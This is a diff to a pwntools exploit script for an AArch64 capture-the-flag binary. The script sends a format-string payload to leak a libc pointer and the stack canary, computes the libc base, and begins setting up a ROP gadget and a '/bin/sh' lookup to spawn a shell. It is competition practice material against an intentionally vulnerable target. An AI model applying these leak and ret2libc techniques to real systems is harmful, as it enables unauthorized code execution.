@@ -1,7 +1,5 @@
 from pwn import *
-import os
 
-#os.environ['LD_LIBRARY_PATH'] = '.'
 context.terminal = ['tmux', 'split-window', '-h']
 
 elf = context.binary = ELF('chalarm')
@@ -12,32 +10,26 @@ ld = ELF('ld-linux-aarch64.so.1')
 
 #p = process('qemu-aarch64 chal'.split())
 
-p = remote('18.219.102.246', 5000)
+p = remote('arm-and-a-leg.gold.b01le.rs', 1337)
 
 
 p.sendlineafter(b'2. Legs\n', b'1')
 p.sendlineafter(b'of?\n', b'1337')
 # These are leaks for chal with pie
-p.sendlineafter(b'appendage? ', b'%13$p%21$p%19$p')
+p.sendlineafter(b'appendage? ', b'%21$p%19$p')
 # the below was for chal with pie
 #p.sendlineafter(b'appendage? ', b'%23$p%21$p%19$p')
 p.recv()
 leaks = p.recv().split(b'0x')
-# main is at the 23rd offset
-main_leak = leaks[1]
-main = int(main_leak, 16)
 # libc_start_main + 152 is at the 21st offset MAKE SURE TO SUBTRACT 152 FROM THE LEAK
-libc_start_main_leak = leaks[2] 
+libc_start_main_leak = leaks[1] 
 libc_start_main = int(libc_start_main_leak, 16) - 152
 
-canaryleak = leaks[3].split(b'\n')[0]
+# Canary at 19th offset
+canaryleak = leaks[2].split(b'\n')[0]
 canary = int(canaryleak, 16)
-#elf_base = main - elf.symbols.main
-#elf.address = elf_base
+
 libc.address = libc_start_main - libc.symbols['__libc_start_main']
-print(leaks)
-print(hex(canary))
-print(hex(libc.address))
 
 ldr_x19 = 0x00000000004008f4
 binsh = libc.search(b'/bin/sh').__next__()
